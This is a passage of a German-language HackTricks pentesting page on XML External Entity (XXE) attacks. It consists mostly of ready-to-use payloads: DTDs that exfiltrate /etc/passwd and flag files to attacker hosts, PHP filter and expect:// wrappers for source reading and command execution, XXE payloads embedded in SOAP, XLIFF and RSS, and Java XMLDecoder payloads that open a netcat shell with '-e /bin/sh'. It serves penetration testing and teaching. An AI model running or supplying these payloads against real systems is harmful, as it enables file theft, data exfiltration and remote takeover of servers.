Wenn das Web PHP verwendet, k√∂nnen Sie anstelle von `file:/` **php wrappers**`php://filter/convert.base64-encode/resource=` verwenden, um **auf interne Dateien** zuzugreifen.

Wenn das Web Java verwendet, k√∂nnen Sie das [**jar: Protokoll**](xxe-xee-xml-external-entity.md#jar-protocol) √ºberpr√ºfen.

### HTML Entities

Trick von [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Sie k√∂nnen eine **Entit√§t innerhalb einer Entit√§t** erstellen, indem Sie sie mit **html entities** kodieren und dann aufrufen, um **eine dtd zu laden**.\
Beachten Sie, dass die verwendeten **HTML Entities** **numerisch** sein m√ºssen (wie \[in diesem Beispiel]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD-Beispiel:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP Wrappers

### Base64

**Extrahieren** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Externen Ressourcen extrahieren**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Remote code execution

**Wenn das PHP "expect" Modul geladen ist**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Dieses Beispiel ist inspiriert von [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

XLIFF (XML Localization Interchange File Format) wird verwendet, um den Datenaustausch in Lokalisierungsprozessen zu standardisieren. Es handelt sich um ein XML-basiertes Format, das haupts√§chlich zum √úbertragen lokalisierbarer Daten zwischen Werkzeugen w√§hrend der Lokalisierung und als gemeinsames Austauschformat f√ºr CAT (Computer-Aided Translation) Werkzeuge verwendet wird.

### Blind Request Analyse

Eine Anfrage wird an den Server mit folgendem Inhalt gesendet:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Jedoch l√∂st diese Anfrage einen internen Serverfehler aus, der speziell ein Problem mit den Markup-Deklarationen erw√§hnt:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Trotz des Fehlers wird ein Treffer auf Burp Collaborator aufgezeichnet, was auf ein gewisses Ma√ü an Interaktion mit der externen Entit√§t hinweist.

Out of Band Data Exfiltration Um Daten zu exfiltrieren, wird eine modifizierte Anfrage gesendet:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Dieser Ansatz zeigt, dass der User Agent die Verwendung von Java 1.8 anzeigt. Eine bemerkte Einschr√§nkung dieser Version von Java ist die Unf√§higkeit, Dateien mit einem Zeilenumbruchzeichen, wie /etc/passwd, mithilfe der Out of Band-Technik abzurufen.

Error-Based Data Exfiltration Um diese Einschr√§nkung zu √ºberwinden, wird ein Error-Based-Ansatz verwendet. Die DTD-Datei ist wie folgt strukturiert, um einen Fehler auszul√∂sen, der Daten aus einer Zieldatei enth√§lt:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Der Server antwortet mit einem Fehler, der wichtig auf die nicht vorhandene Datei hinweist und anzeigt, dass der Server versucht, auf die angegebene Datei zuzugreifen:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Um den Inhalt der Datei in die Fehlermeldung einzuf√ºgen, wird die DTD-Datei angepasst:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Diese Modifikation f√ºhrt zur erfolgreichen Exfiltration des Inhalts der Datei, da sie im Fehlerausgabe, die √ºber HTTP gesendet wird, reflektiert wird. Dies zeigt einen erfolgreichen XXE (XML External Entity) Angriff an, der sowohl Out of Band- als auch Error-Based-Techniken nutzt, um sensible Informationen zu extrahieren.

## RSS - XEE

G√ºltiges XML im RSS-Format, um eine XXE-Schwachstelle auszunutzen.

### Ping back

Einfacher HTTP-Anfrage an den Server des Angreifers.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Datei lesen
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Quellcode lesen

Verwendung des PHP base64-Filters
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE zu RCE

XMLDecoder ist eine Java-Klasse, die Objekte basierend auf einer XML-Nachricht erstellt. Wenn ein b√∂swilliger Benutzer eine Anwendung dazu bringen kann, willk√ºrliche Daten in einem Aufruf der Methode **readObject** zu verwenden, erh√§lt er sofort die M√∂glichkeit zur Codeausf√ºhrung auf dem Server.

### Verwendung von Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Tools

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## References

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\\
* Informationen √ºber HTTP mit eigener externer DTD extrahieren: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos sendest.

</details>
{% endhint %}
